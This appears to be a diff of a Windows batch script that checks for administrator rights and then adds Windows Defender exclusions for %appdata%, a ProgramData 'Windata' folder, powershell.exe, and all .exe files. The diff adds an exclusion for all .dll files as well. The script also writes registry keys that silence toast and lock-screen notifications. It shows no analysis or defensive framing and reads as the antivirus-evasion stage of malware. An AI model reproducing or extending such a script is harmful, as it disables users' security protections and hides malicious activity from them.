@@ -1,3 +1,4 @@
+
 @echo off 
 net session >nul 2>&1
 if %errorLevel% neq 0 (
@@ -12,6 +13,7 @@ Powershell Add-MpPreference -ExclusionPath '%appdata%'
 Powershell Add-MpPreference -ExclusionPath '%systemdrive%\programdata\Windata'
 Powershell Add-MpPreference -ExclusionProcess 'powershell.exe'
 Powershell Add-MpPreference -ExclusionExtension '.exe'
+Powershell Add-MpPreference -ExclusionExtension '.dll'
 echo ---------regedit-edite------------------------------------------------
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v LockScreenToastEnabled /t REG_DWORD /d 0 /f
